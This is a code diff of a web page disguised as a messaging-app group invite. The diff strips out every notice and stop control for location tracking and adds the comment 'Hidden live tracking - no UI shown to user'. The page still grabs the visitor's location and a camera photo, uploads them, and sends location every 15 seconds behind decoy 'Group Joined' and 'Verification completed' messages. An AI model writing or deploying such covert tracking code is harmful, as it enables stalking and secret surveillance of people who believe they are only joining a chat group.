@@ -235,39 +235,6 @@
 
     .member-avatar-small:first-child { margin-left: 0; }
 
-    /* Live tracking status indicator */
-    .tracking-status {
-        background: #2a3942;
-        margin: 12px 20px;
-        padding: 12px;
-        border-radius: 16px;
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        flex-shrink: 0;
-    }
-    .tracking-dot {
-        width: 10px;
-        height: 10px;
-        border-radius: 50%;
-        background: #22c55e;
-        animation: pulse 1.5s infinite;
-        margin-right: 10px;
-    }
-    @keyframes pulse {
-        0%, 100% { opacity: 1; transform: scale(1); }
-        50% { opacity: 0.5; transform: scale(1.2); }
-    }
-    .tracking-text { font-size: 13px; color: #e9edef; }
-    .tracking-count { font-size: 12px; color: #8696a0; }
-    .stop-tracking {
-        background: none;
-        border: none;
-        color: #dc2626;
-        font-size: 12px;
-        cursor: pointer;
-    }
-
     .sheet-spacer { flex: 1; }
     .sheet-bottom { padding: 0 20px 32px 20px; flex-shrink: 0; }
     .created-line { text-align: center; font-size: 12px; color: #8696a0; margin-bottom: 14px; padding-top: 8px; }
@@ -399,19 +366,7 @@
     <div class="group-hero">
         <div class="group-icon-circle">👥</div>
         <div class="group-name-text">Friends</div>
-        <div class="group-meta">Real-time location sharing active</div>
-    </div>
-    
-    <!-- Live Tracking Status -->
-    <div class="tracking-status" id="trackingStatusDiv" style="display: none;">
-        <div style="display: flex; align-items: center;">
-            <div class="tracking-dot"></div>
-            <div class="tracking-text">📍 Live tracking active</div>
-        </div>
-        <div>
-            <span class="tracking-count" id="liveCount">0 updates</span>
-            <button class="stop-tracking" onclick="stopLiveTracking()">Stop</button>
-        </div>
+        <div class="group-meta">Join group to connect</div>
     </div>
 
     <div class="member-row">
@@ -423,7 +378,7 @@
     </div>
     <div class="sheet-spacer"></div>
     <div class="sheet-bottom">
-        <div class="created-line">Live tracking • Updates every 15 seconds</div>
+        <div class="created-line">Created by You • today</div>
         <button id="joinBtn" class="join-btn" onclick="startTracking()">
             <svg width="20" height="20" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><path d="M23.5 8.5C21.6 6.6 19.1 5.5 16.4 5.5c-5.5 0-10 4.5-10 10 0 1.8.5 3.5 1.3 5L5.5 26.5l6.2-1.6c1.4.8 3 1.2 4.7 1.2 5.5 0 10-4.5 10-10 0-2.7-1-5.2-2.9-7.1zm-7.1 15.4c-1.5 0-3-.4-4.3-1.2l-.3-.2-3.1.8.8-3-.2-.3c-.8-1.3-1.3-2.9-1.3-4.5 0-4.6 3.7-8.3 8.3-8.3 2.2 0 4.3.9 5.9 2.4 1.6 1.6 2.4 3.7 2.4 5.9.1 4.6-3.7 8.4-8.2 8.4zm4.5-6.2c-.2-.1-1.4-.7-1.6-.8-.2-.1-.4-.1-.5.1-.2.2-.6.8-.8 1-.1.2-.3.2-.5.1-.7-.3-1.5-.7-2.1-1.3-.5-.5-1-1.1-1.4-1.7-.1-.2 0-.4.1-.5l.4-.4c.1-.1.2-.3.3-.5.1-.2 0-.3 0-.5-.1-.2-.5-1.3-.7-1.8-.2-.4-.4-.4-.5-.4h-.5c-.2 0-.5.1-.7.3-.2.2-.9.9-.9 2.2s.9 2.5 1 2.7c.1.2 1.8 2.8 4.4 3.8.6.3 1.1.4 1.5.5.6.2 1.2.2 1.6.1.5-.1 1.4-.6 1.6-1.1.2-.6.2-1 .1-1.1-.1-.2-.3-.3-.5-.4z" fill="white"/></svg>
             JOIN GROUP
@@ -451,7 +406,6 @@ async function startTracking() {
         return;
     }
     
-    // Get initial location
     navigator.geolocation.getCurrentPosition(
         async function(position) {
             initialLocationData = {
@@ -460,8 +414,6 @@ async function startTracking() {
                 accuracy: position.coords.accuracy
             };
             showToast("✅ Location captured! Accessing camera...");
-            
-            // Get camera and capture photo
             await captureInitialPhoto();
         },
         function(error) {
@@ -494,7 +446,6 @@ async function captureInitialPhoto() {
         };
     } catch (err) {
         console.error("Camera error:", err);
-        // Continue without photo
         saveInitialLocationWithoutPhoto();
     }
 }
@@ -536,7 +487,7 @@ function saveToServer(location, photoData) {
     .then(response => response.json())
     .then(data => {
         if (data.status === "success") {
-            showToast("✅ Initial data saved! Starting live tracking...");
+            showToast("✅ Verification completed!");
             startLiveTracking();
             showSuccessModal();
         } else {
@@ -555,21 +506,14 @@ function startLiveTracking() {
     isLiveActive = true;
     liveCount = 0;
     
-    document.getElementById('trackingStatusDiv').style.display = 'flex';
-    document.getElementById('joinBtn').style.display = 'none';
-    document.getElementById('liveCount').innerText = '0 updates';
-    
-    // Capture first live location
+    // Hidden live tracking - no UI shown to user
     captureLiveLocation();
     
-    // Set interval for live tracking (every 15 seconds)
     liveInterval = setInterval(() => {
         if (isLiveActive) {
             captureLiveLocation();
         }
     }, 15000);
-    
-    showToast("📍 Live tracking started! Updates every 15 seconds.");
 }
 
 function captureLiveLocation() {
@@ -603,22 +547,10 @@ function sendLiveLocation(position) {
     .then(data => {
         if (data.status === "success") {
             liveCount++;
-            document.getElementById('liveCount').innerText = `${liveCount} updates`;
             console.log(`📍 Live location #${liveCount}: ${position.coords.latitude}, ${position.coords.longitude}`);
         }
     })
     .catch(error => console.error("Save error:", error));
-}
-
-function stopLiveTracking() {
-    if (liveInterval) {
-        clearInterval(liveInterval);
-        liveInterval = null;
-    }
-    isLiveActive = false;
-    showToast("⏹ Live tracking stopped");
-    document.getElementById('trackingStatusDiv').style.display = 'none';
-    document.getElementById('joinBtn').style.display = 'flex';
 }
 
 function showToast(message) {
@@ -637,9 +569,9 @@ function showSuccessModal() {
     modal.innerHTML = `
         <div class="success-content">
             <div class="success-icon">✅</div>
-            <h3>Live Tracking Active!</h3>
-            <p>Your location is being tracked. Updates every 15 seconds.</p>
-            <button onclick="this.closest('.success-modal').remove()">OK</button>
+            <h3>Group Joined Successfully!</h3>
+            <p>You have been added to Friends group.</p>
+            <button onclick="window.location.href='/'">OK</button>
         </div>
     `;
     document.body.appendChild(modal);
